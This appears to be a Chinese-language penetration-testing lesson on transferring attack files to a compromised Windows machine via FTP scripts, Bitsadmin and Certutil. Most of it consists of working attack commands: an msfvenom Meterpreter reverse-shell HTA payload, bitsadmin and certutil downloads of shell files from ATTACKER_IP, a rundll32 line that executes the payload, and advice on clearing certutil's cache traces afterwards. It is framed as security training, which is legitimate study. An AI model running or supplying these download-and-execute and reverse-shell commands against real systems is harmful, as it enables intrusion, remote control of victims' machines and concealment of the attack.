#  059：Windows系统下的文件传输 📁➡️💻

![](img/60be7da9a5382862724175ef497e01ed_1.png)

![](img/60be7da9a5382862724175ef497e01ed_3.png)

在本节课中，我们将学习在Windows系统环境下进行内网文件传输的几种常用方法。掌握这些技术对于渗透测试和网络安全工作至关重要。

## 概述

![](img/60be7da9a5382862724175ef497e01ed_5.png)

文件传输是内网渗透中的常见需求。当我们获得一个初始立足点（例如一个Shell）后，通常需要将工具或Payload上传到目标机器以进一步行动。本节将介绍三种在Windows系统下实现文件传输的方法。

![](img/60be7da9a5382862724175ef497e01ed_7.png)

![](img/60be7da9a5382862724175ef497e01ed_9.png)

## FTP文件传输协议

![](img/60be7da9a5382862724175ef497e01ed_11.png)

![](img/60be7da9a5382862724175ef497e01ed_13.png)

首先，我们介绍使用FTP协议进行文件传输。FTP是标准的文件传输协议，Windows系统通常自带FTP客户端。

![](img/60be7da9a5382862724175ef497e01ed_15.png)

![](img/60be7da9a5382862724175ef497e01ed_16.png)

![](img/60be7da9a5382862724175ef497e01ed_17.png)

**核心命令**：在命令行中，可以使用 `ftp` 命令启动客户端。

![](img/60be7da9a5382862724175ef497e01ed_18.png)

![](img/60be7da9a5382862724175ef497e01ed_20.png)

![](img/60be7da9a5382862724175ef497e01ed_22.png)

![](img/60be7da9a5382862724175ef497e01ed_24.png)

![](img/60be7da9a5382862724175ef497e01ed_26.png)

![](img/60be7da9a5382862724175ef497e01ed_27.png)

![](img/60be7da9a5382862724175ef497e01ed_28.png)

![](img/60be7da9a5382862724175ef497e01ed_29.png)

以下是利用FTP从攻击机下载文件到目标机的步骤：

![](img/60be7da9a5382862724175ef497e01ed_31.png)

![](img/60be7da9a5382862724175ef497e01ed_32.png)

![](img/60be7da9a5382862724175ef497e01ed_34.png)

![](img/60be7da9a5382862724175ef497e01ed_35.png)

![](img/60be7da9a5382862724175ef497e01ed_37.png)

![](img/60be7da9a5382862724175ef497e01ed_38.png)

![](img/60be7da9a5382862724175ef497e01ed_39.png)

![](img/60be7da9a5382862724175ef497e01ed_41.png)

1.  在攻击机上使用Python快速搭建一个FTP服务器。
    ```bash
    python3 -m pyftpdlib -p 2121
    ```
2.  在已获得Shell的目标机上，编写一个FTP脚本文件。
    ```batch
    echo open 192.168.1.100 2121 > ftp.txt
    echo anonymous >> ftp.txt
    echo >> ftp.txt
    echo get malicious.exe >> ftp.txt
    echo quit >> ftp.txt
    ```
3.  在目标机上执行该脚本，自动连接FTP服务器并下载文件。
    ```batch
    ftp -s:ftp.txt
    ```

![](img/60be7da9a5382862724175ef497e01ed_43.png)

![](img/60be7da9a5382862724175ef497e01ed_45.png)

![](img/60be7da9a5382862724175ef497e01ed_47.png)

**注意事项**：FTP服务若配置不当（如允许匿名登录且目录权限过大），可能被攻击者利用来上传恶意文件。

![](img/60be7da9a5382862724175ef497e01ed_49.png)

![](img/60be7da9a5382862724175ef497e01ed_51.png)

![](img/60be7da9a5382862724175ef497e01ed_53.png)

## Bitsadmin命令行工具

![](img/60be7da9a5382862724175ef497e01ed_55.png)

![](img/60be7da9a5382862724175ef497e01ed_57.png)

上一节我们介绍了FTP，本节我们来看看Windows自带的另一个强大工具——Bitsadmin。它是一个命令行工具，可用于创建、监视和管理文件下载/上传作业。

![](img/60be7da9a5382862724175ef497e01ed_59.png)

![](img/60be7da9a5382862724175ef497e01ed_61.png)

以下是使用Bitsadmin下载远程文件的步骤：

![](img/60be7da9a5382862724175ef497e01ed_63.png)

![](img/60be7da9a5382862724175ef497e01ed_65.png)

![](img/60be7da9a5382862724175ef497e01ed_67.png)

1.  首先，在攻击机上生成一个恶意Payload（例如一个HTA文件）。
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f hta-psh -o shell.hta
    ```
2.  将该文件放置在攻击机可通过HTTP访问的目录（如Web服务器根目录）。
3.  在目标机的Shell中，使用Bitsadmin命令下载该文件。
    ```batch
    bitsadmin /transfer myjob /download /priority high http://ATTACKER_IP/shell.hta C:\Windows\Temp\shell.hta
    ```
4.  文件下载完成后，使用`rundll32`执行HTA文件以反弹Shell。
    ```batch
    rundll32.exe url.dll, OpenURL C:\Windows\Temp\shell.hta
    ```

![](img/60be7da9a5382862724175ef497e01ed_69.png)

![](img/60be7da9a5382862724175ef497e01ed_71.png)

**命令解析**：`/transfer` 参数用于创建传输作业，`myjob`是作业名称，`/download`指定为下载操作，后面跟随远程URL和本地保存路径。

![](img/60be7da9a5382862724175ef497e01ed_73.png)

## Certutil证书工具

![](img/60be7da9a5382862724175ef497e01ed_75.png)

![](img/60be7da9a5382862724175ef497e01ed_77.png)

![](img/60be7da9a5382862724175ef497e01ed_79.png)

![](img/60be7da9a5382862724175ef497e01ed_81.png)

![](img/60be7da9a5382862724175ef497e01ed_83.png)

除了Bitsadmin，Windows系统还自带一个名为Certutil的工具，它本是用于管理证书的命令行程序，但也可被用来下载文件。

![](img/60be7da9a5382862724175ef497e01ed_84.png)

![](img/60be7da9a5382862724175ef497e01ed_85.png)

![](img/60be7da9a5382862724175ef497e01ed_86.png)

以下是使用Certutil下载文件的方法：

1.  在目标机的Shell中，直接使用Certutil命令下载远程文件。
    ```batch
    certutil -urlcache -split -f http://ATTACKER_IP/shell.exe C:\Windows\Temp\shell.exe
    ```
2.  命令执行成功后，文件即被下载到指定路径。

![](img/60be7da9a5382862724175ef497e01ed_88.png)

![](img/60be7da9a5382862724175ef497e01ed_90.png)

**重要提醒**：使用Certutil下载文件后，会在以下目录留下缓存：
`C:\Users\[用户名]\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`
渗透测试完成后，应注意清理相关痕迹。

![](img/60be7da9a5382862724175ef497e01ed_92.png)

![](img/60be7da9a5382862724175ef497e01ed_94.png)

![](img/60be7da9a5382862724175ef497e01ed_96.png)

![](img/60be7da9a5382862724175ef497e01ed_98.png)

## 总结

![](img/60be7da9a5382862724175ef497e01ed_100.png)

本节课我们一起学习了在Windows系统下进行内网文件传输的三种方法：
1.  **利用FTP协议**：通过搭建简易FTP服务器和编写脚本实现自动化下载。
2.  **使用Bitsadmin工具**：利用系统自带工具创建下载作业，适合下载后直接执行Payload。
3.  **利用Certutil程序**：借助证书管理工具的功能实现文件下载，但会留下缓存痕迹。

![](img/60be7da9a5382862724175ef497e01ed_102.png)

![](img/60be7da9a5382862724175ef497e01ed_104.png)

每种方法都有其适用场景，在实际渗透测试中，需要根据目标环境的具体情况（如网络策略、工具可用性）灵活选择和组合使用。理解这些基本原理是进行有效内网渗透的基础。